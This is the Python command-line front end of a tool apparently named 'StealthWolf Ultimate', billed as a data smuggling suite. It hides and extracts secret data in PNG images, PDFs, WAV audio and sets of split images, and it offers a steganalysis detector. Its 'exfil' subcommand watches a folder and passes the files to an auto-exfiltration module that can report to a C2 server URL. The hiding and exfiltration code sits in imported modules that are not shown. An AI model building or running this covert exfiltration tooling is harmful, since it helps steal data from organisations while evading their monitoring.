#!/usr/bin/env python3
"""
CyberWolf StealthWolf Ultimate - Complete Data Smuggling Suite
Features: Image, PDF, Audio, Split smuggling, Auto-exfil, Detection
"""

import argparse
import sys
import os

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

def main():
    parser = argparse.ArgumentParser(description="🐺 CyberWolf StealthWolf Ultimate")
    subparsers = parser.add_subparsers(dest='command', required=True)
    
    # Image smuggling
    img = subparsers.add_parser('smuggle', help='Hide data in image')
    img.add_argument('-i', '--input', required=True, help='Carrier image (PNG)')
    img.add_argument('-d', '--data', required=True, help='Secret data')
    img.add_argument('-o', '--output', required=True, help='Output PNG')
    img.add_argument('-p', '--password', required=True, help='Password')
    
    # Extract
    ext = subparsers.add_parser('extract', help='Extract data from image')
    ext.add_argument('-i', '--input', required=True, help='Stego image')
    ext.add_argument('-p', '--password', required=True, help='Password')
    
    # PDF smuggling
    pdf = subparsers.add_parser('pdf', help='Hide data in PDF')
    pdf.add_argument('-i', '--input', required=True, help='Input PDF')
    pdf.add_argument('-d', '--data', required=True, help='Secret data')
    pdf.add_argument('-o', '--output', required=True, help='Output PDF')
    pdf.add_argument('-p', '--password', required=True, help='Password')
    
    pdf_ext = subparsers.add_parser('pdf-extract', help='Extract from PDF')
    pdf_ext.add_argument('-i', '--input', required=True, help='Stego PDF')
    pdf_ext.add_argument('-p', '--password', required=True, help='Password')
    
    # Audio smuggling
    audio = subparsers.add_parser('audio', help='Hide data in WAV')
    audio.add_argument('-i', '--input', required=True, help='Input WAV')
    audio.add_argument('-d', '--data', required=True, help='Secret data')
    audio.add_argument('-o', '--output', required=True, help='Output WAV')
    audio.add_argument('-p', '--password', required=True, help='Password')
    
    audio_ext = subparsers.add_parser('audio-extract', help='Extract from WAV')
    audio_ext.add_argument('-i', '--input', required=True, help='Stego WAV')
    audio_ext.add_argument('-p', '--password', required=True, help='Password')
    
    # Split smuggling
    split = subparsers.add_parser('split', help='Split data across multiple images')
    split.add_argument('-i', '--images', nargs='+', required=True, help='Input images')
    split.add_argument('-d', '--data', required=True, help='Secret data')
    split.add_argument('-o', '--output-dir', required=True, help='Output directory')
    split.add_argument('-p', '--password', required=True, help='Password')
    
    split_ext = subparsers.add_parser('split-extract', help='Extract from split images')
    split_ext.add_argument('-i', '--images', nargs='+', required=True, help='Stego images')
    split_ext.add_argument('-p', '--password', required=True, help='Password')
    
    # Auto-exfiltration
    exfil = subparsers.add_parser('exfil', help='Auto-exfiltration watch folder')
    exfil.add_argument('-w', '--watch', required=True, help='Directory to watch')
    exfil.add_argument('-c', '--c2', help='C2 server URL (optional)')
    exfil.add_argument('-p', '--password', required=True, help='Password')
    
    # Detection
    detect = subparsers.add_parser('detect', help='Detect hidden data')
    detect.add_argument('-i', '--input', required=True, help='File to analyze')
    
    # Test
    test = subparsers.add_parser('test', help='Run all tests')
    
    args = parser.parse_args()
    
    if args.command == 'test':
        print("🐺 Running StealthWolf Ultimate Tests...")
        
        # Test 1: Image smuggling
        from PIL import Image
        import numpy as np
        from smuggler.image_smuggler import ImageSmuggler
        
        img = Image.fromarray(np.random.randint(0, 255, (200, 200, 3), dtype=np.uint8))
        img.save("/tmp/test_img.png", format='PNG')
        
        s = ImageSmuggler("testpass")
        secret = b"TOP SECRET TEST DATA"
        
        result = s.smuggle_into_image("/tmp/test_img.png", secret, "/tmp/test_stego.png")
        extracted, _ = s.extract_from_image("/tmp/test_stego.png")
        
        print(f"✅ Image smuggling: {secret == extracted}")
        
        # Test 2: PDF
        try:
            from smuggler.pdf_smuggler import PDFSmuggler
            # Create dummy PDF
            from reportlab.pdfgen import canvas
            c = canvas.Canvas("/tmp/test.pdf")
            c.drawString(100, 750, "Test PDF")
            c.save()
            
            pdf_s = PDFSmuggler("testpass")
            pdf_s.smuggle_into_pdf("/tmp/test.pdf", secret, "/tmp/test_stego.pdf")
            extracted_pdf = pdf_s.extract_from_pdf("/tmp/test_stego.pdf")
            print(f"✅ PDF smuggling: {secret == extracted_pdf}")
        except Exception as e:
            print(f"⚠️ PDF test skipped: {e}")
        
        print("\n🎉 StealthWolf Ultimate ready!")
        return
    
    elif args.command == 'smuggle':
        from smuggler.image_smuggler import ImageSmuggler
        s = ImageSmuggler(args.password)
        result = s.smuggle_into_image(args.input, args.data.encode(), args.output)
        print(f"✅ {result}")
    
    elif args.command == 'extract':
        from smuggler.image_smuggler import ImageSmuggler
        s = ImageSmuggler(args.password)
        data, _ = s.extract_from_image(args.input)
        print(f"✅ Extracted: {data.decode()}")
    
    elif args.command == 'pdf':
        from smuggler.pdf_smuggler import PDFSmuggler
        s = PDFSmuggler(args.password)
        result = s.smuggle_into_pdf(args.input, args.data.encode(), args.output)
        print(f"✅ PDF hidden: {result}")
    
    elif args.command == 'pdf-extract':
        from smuggler.pdf_smuggler import PDFSmuggler
        s = PDFSmuggler(args.password)
        data = s.extract_from_pdf(args.input)
        print(f"✅ Extracted: {data.decode()}")
    
    elif args.command == 'audio':
        from smuggler.audio_smuggler import AudioSmuggler
        s = AudioSmuggler(args.password)
        result = s.smuggle_into_wav(args.input, args.data.encode(), args.output)
        print(f"✅ Audio hidden: {result}")
    
    elif args.command == 'audio-extract':
        from smuggler.audio_smuggler import AudioSmuggler
        s = AudioSmuggler(args.password)
        data = s.extract_from_wav(args.input)
        print(f"✅ Extracted: {data.decode()}")
    
    elif args.command == 'split':
        from smuggler.split_smuggler import SplitSmuggler
        s = SplitSmuggler(args.password)
        result = s.smuggle_split(args.images, args.data.encode(), args.output_dir)
        print(f"✅ Split across {result['num_images']} images")
    
    elif args.command == 'split-extract':
        from smuggler.split_smuggler import SplitSmuggler
        s = SplitSmuggler(args.password)
        data = s.extract_split(args.images)
        print(f"✅ Extracted: {data.decode()}")
    
    elif args.command == 'exfil':
        from smuggler.image_smuggler import ImageSmuggler
        from exfil.auto_exfil import AutoExfiltrator
        
        s = ImageSmuggler(args.password)
        exfil = AutoExfiltrator(s, [args.watch], args.c2)
        print(f"🐺 Watching {args.watch}...")
        exfil.start()
    
    elif args.command == 'detect':
        from detector.steganalysis_advanced import SteganalysisDetector
        d = SteganalysisDetector()
        result = d.full_analysis(args.input)
        print(f"\n🔍 Steganalysis Results:")
        print(f"   {result['overall_verdict']}")
        print(f"   Risk Score: {result['risk_score']}/100")

if __name__ == "__main__":
    main()
